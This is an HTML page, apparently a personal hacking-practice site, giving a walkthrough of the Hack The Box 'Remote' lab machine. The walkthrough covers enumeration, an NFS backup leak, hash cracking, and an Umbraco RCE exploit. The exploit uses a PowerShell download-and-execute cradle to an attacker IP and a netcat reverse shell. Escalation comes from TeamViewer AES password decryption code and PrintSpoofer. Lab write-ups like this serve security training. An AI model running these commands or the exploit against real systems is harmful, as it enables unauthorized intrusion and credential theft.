@@ -1,0 +1,342 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Remote</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty : 4.5</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Home - Acme Widgets
+111/tcp   open  rpcbind?
+|_rpcinfo: ERROR: Script execution failed (use -d to debug)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+2049/tcp  open  nfs           2-4 (RPC #100003)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+
+<p class="text">There are several running application we can enumearate. FTP allows anonymous login, http, and <u>NFS which is a protocol that allows a computer to access files over a network as if they were on its local storage</u>.</p>
+
+<div class="code-box"><pre><code>└─$ ftp $IP 
+Connected to 10.129.230.172.
+220 Microsoft FTP Service
+Name (10.129.230.172:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+229 Entering Extended Passive Mode (|||49715|)
+125 Data connection already open; Transfer starting.
+226 Transfer complete.</code></pre></div>
+
+<p class="text">There is no files we can download. Next target is NFS.</p>
+
+<div class="code-box"><pre><code>└─$ showmount -e $IP       
+Export list for 10.129.230.172:
+/site_backups (everyone)</code></pre></div>
+
+<p class="text">We found a path /site_backups that we can mount.</p>
+
+<div class="code-box"><pre><code>└─$ mkdir backups
+└─$ <u>sudo mount -t nfs $IP:/site_backups backups/</u></code></pre></div>
+
+<p class="text">The backup is installed to the backups dir we created. </p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/backups]
+└─$ ls
+App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
+App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views</code></pre></div>
+
+<p class="text">And I found unknown credentials on AppData/Umbraco.sdf.</p>
+
+<div class="code-box"><pre><code>└─$ strings Umbraco.sdf | grep -i admin                           
+...
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+...</code></pre></div>
+
+<p class="text">We can decode it before browse httpserver.</p>
+
+<div class="code-box"><pre><code>└─$ echo 'b8be16afba8c314ad33d812f22a04991b90e2aaa' > hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+...?:baconandcheese</code></pre></div>
+
+<p class="text">Found hash is decoded successfully, and the plain text is <u>baconandcheese</u>. Next we can enumerate http server.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/remote/1.png' %}" alt="">
+    <p class="text">On the root dir of http, there is no interesting information. We need deeper enumeration.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP -x php,html -t 70</u>
+===============================================================
+/Home                 (Status: 200) [Size: 6703]
+/Blog                 (Status: 200) [Size: 5011]
+/Products             (Status: 200) [Size: 5338]
+/People               (Status: 200) [Size: 6749]
+/Contact              (Status: 200) [Size: 7890]
+/blog                 (Status: 200) [Size: 5011]
+/contact              (Status: 200) [Size: 7890]
+/home                 (Status: 200) [Size: 6703]
+/install              (Status: 302) [Size: 126] [--&gt; /umbraco/]
+/intranet             (Status: 200) [Size: 3323]
+/master               (Status: 500) [Size: 3420]
+/people               (Status: 200) [Size: 6739]
+/person               (Status: 200) [Size: 2741]
+/product              (Status: 500) [Size: 3420]
+/products             (Status: 200) [Size: 5328]
+/render/https://www.google.com (Status: 400) [Size: 3420]
+/render/https://www.google.com.html (Status: 400) [Size: 3420]
+/render/https://www.google.com.php (Status: 400) [Size: 3420]
+/umbraco              (Status: 200) [Size: 4040]
+
+===============================================================</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/remote/2.png' %}" alt="">
+    <p class="text">On the umbraco page, I found login page. We should be able to use credential we found before. It says the username is usually email address. So, <u>admin@htb.local:baconandcheese</u> would be cred.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/remote/3.png' %}" alt="">
+    <p class="text">I successfully logon to the admin dashboard, and opening help tab displayed current Umbraco version : 7.12.4. </p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/remote/4.png' %}" alt="">
+    <p class="text">Simple google rearch returned Authenticated Remote Code Execution. We can use this to get reverse shell.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ wget https://www.exploit-db.com/download/46153</code></pre></div>
+<p class="text">We need some modifications.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/remote/5.png' %}" alt="">
+    <p class="text">First, we need to change parameters for login credential and host. Second, we change the cmd = "..." string into arbitrary code on the line 27. At last, the proc.StartInfo.FileName is set to calc.exe. Change it into cmd.exe or powershell.exe. </p>
+</div>
+<p class="text">Because I prefer powershell, i set powershell.exe and execute command like below:</p>
+<div class="code-box"><pre><code>powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.38:8000/shell.ps1')</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/remote/6.png' %}" alt="">
+    <p class="text">Above powershell command query shell.ps1 and execute it. To successfully get reverse shell, we need to open http server and nc -lvnp 4444.</p>
+</div>
+<p class="text">After preparing the two, we can execute the poc file.</p>
+<div class="code-box"><pre><code>└─$ python3 poc.py                                        
+
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.230.172 - - [05/Nov/2025 06:24:07] "GET /shell.ps1 HTTP/1.1" 200 -
+
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.230.172] 49710
+PS C:\windows\system32\inetsrv> whoami
+iis apppool\defaultapppool</code></pre></div>
+
+<p class="text">We got iis user.</p>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">We have two method for privilege escalation. First we can abuse running process's vulnerability, and the second one abuse SeImpersonatePrivilege.</p>
+
+<h2 class="subtitle">PrivEsc 1</h2>
+
+<div class="code-box"><pre><code>PS C:\windows\system32\inetsrv> tasklist
+...
+TeamViewer_Service.exe        2212                            0 
+...</code></pre></div>
+
+<p class="text">We can find the version of TeamViewer under C:\Program Files (x86\TeamViewer).</p>
+<div class="code-box"><pre><code>PS C:\Program Files (x86)\TeamViewer> ls
+
+    Directory: C:\Program Files (x86)\TeamViewer
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/27/2020  10:35 AM                Version7 </code></pre></div>
+
+<p class="text">Also, </p>
+<div class="code-box"><pre><code>PS C:\windows\system32\inetsrv> (Get-Command "C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe").Version
+
+Major  Minor  Build  Revision
+-----  -----  -----  --------
+7      0      0      0      </code></pre></div>
+
+<p class="text">Simple google research 'teamviewer v7 vulnerability' revealed CVE-2019-18988. Accourding to <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-18988">this site</a>, ...it used a shared AES key for all installations since at least as far back as v7.0.43148. Therefore, we might be able to find the AES key in registory keys.</p>
+
+<div class="code-box"><pre><code>PS C:\windows\system32\inetsrv> cd HKLM:\software\wow6432node\teamviewer\version7
+PS HKLM:\software\wow6432node\teamviewer\version7>  get-itemproperty -path .
+...
+SecurityPasswordAES       : {255, 155, 28, 115...}
+...</code></pre></div>
+<div class="code-box"><pre><code>PS HKLM:\software\wow6432node\teamviewer\version7> (get-itemproperty -path .).SecurityPasswordAES
+255
+155
+28
+115
+214
+107
+206
+49
+172
+65
+62
+174
+19
+...</code></pre></div>
+
+<p class="text">We found AES 128. Though there is a metasploit module post/windows/gather/credentials/teamviewer_passwords, this requires meterpreter session. Though I knew it's better to recreate reverse shell with meterpreter, I decided to write decryption code with python.</p>
+<p class="text">Searching method for AES decryption, we seem to be able to use Crypto.Cipher library. Also, according to the metasploit module source code below,</p>
+<div class="code-box"><pre><code>def decrypt(encrypted_data)
+    password = ""
+    return password unless encrypted_data
+
+    password = ""
+
+    key = "\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
+    iv  = "\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
+    aes = OpenSSL::Cipher.new("AES-128-CBC")</code></pre></div>
+
+    <p class="text">We can use this key and iv hex strings.</p>
+    <p class="text">First I pasted AES digit.</p>
+    <div class="code-box"><pre><code>└─$ cat AES.encrypted      
+255
+155
+28
+115
+214
+107
+206
+49
+172
+65
+62
+174
+19
+27
+70
+79
+88
+47
+108
+226
+209
+225
+243
+218
+126
+141
+55
+107
+38
+57
+78
+91</code></pre></div>
+<p class="text">And wrote code</p>
+<div class="code-box"><pre><code>from Crypto.Cipher import AES
+
+key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
+iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
+ 
+with open('/home/kali/tempo/AES.encrypted',mode='r',encoding='utf-8',errors='ignore') as f:
+    list = [line.rstrip('\n') for line in f]
+digits = []
+
+for i in list:
+    digit = int(i)
+    digits.append(digit)
+
+print(digits)
+encryption = bytes(digits)
+aes = AES.new(key, AES.MODE_CBC, IV=iv)
+password = aes.decrypt(encryption).decode("utf-16").rstrip("\x00")
+
+print(f"[:l] CRACKED PASSWORD! : {password}")</code></pre></div>
+
+<p class="text">Then, run it.</p>
+<div class="code-box"><pre><code>└─$ python3 dec.py                  
+[255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91]
+[:l] CRACKED PASSWORD! : !R3m0te!</code></pre></div>
+<p class="text">We could decode passowrd.</p>
+<p class="text"><u>※You have to install pycryptodome with pip. I suggest you to make venv environment and activate it.</u></p>
+
+<p class="text">Let's check if it can be used for Admin auth.</p>
+<div class="code-box"><pre><code>└─$ crackmapexec smb $IP -u Administrator -p '!R3m0te!'
+SMB         10.129.230.172  445    REMOTE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
+SMB         10.129.230.172  445    REMOTE           [+] remote\Administrator:!R3m0te! (Pwn3d!)</code></pre></div>
+
+<p class="text">We Pwn3d Administrator. We can access to the target machine with both impacket-psexec and evil-winrm. I prefer evil-winrm.</p>
+<div class="code-box"><pre><code>└─$ evil-winrm -i $IP -u Administrator -p '!R3m0te!'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+remote\administrator</code></pre></div>
+<p class="text">We got Administrator shell.</p>
+
+
+<h2 class="subtitle">PrivEsc 2 : SeImpersonatePrivilege</h2>
+<div class="code-box"><pre><code>We can confirm that the user iis has SeImpersonatePrivilege. </code></pre></div>
+<p class="text">However, we can also the system OS and version is relatively new and PotatoFamily might not be usable for this machine. </p>
+<div class="code-box"><pre><code>PS HKLM:\software\wow6432node\teamviewer\version7> systeminfo
+
+Host Name:                 REMOTE
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763</code></pre></div>
+<p class="text">However, there's actually another exploit method <u>PrintSpoof</u>, which can be used for Windows 10. You can install pre-built exe file from <a href="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0">here</a>.</p>
+<p class="text">Let's upload this file to the target box. For that purpose, I prefer to use impacket-smbserver since it can transfer files stably and safely.</p>
+<div class="code-box"><pre><code>└─$ impacket-smbserver share . -smb2support -username a -password a
+
+PS C:\windows\system32\inetsrv> net use \\10.10.16.38\share /user:a a
+PS C:\windows\system32\inetsrv> copy \\10.10.16.38\share\PrintSpoof64.exe C:\ProgramData\PrintSpoof64.exe</code></pre></div>
+
+<p class="text">Then, I'll reuse the shell.ps1 file before I used to get first reverse shell.</p>
+
+<div class="code-box"><pre><code>└─$ python3 -m http.server 8000
+└─$ nc -lvnp 4444
+
+PS C:\ProgramData> .\PrintSpoofer64.exe -i -c "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.38:8000/shell.ps1')"</code></pre></div>
+
+<p class="text">Then, reverse shell comes from the target IP.</p>
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.230.172] 4
+whoami
+nt authority\system
+PS C:\Windows\system32> </code></pre></div>
+
+</body>
+</html>
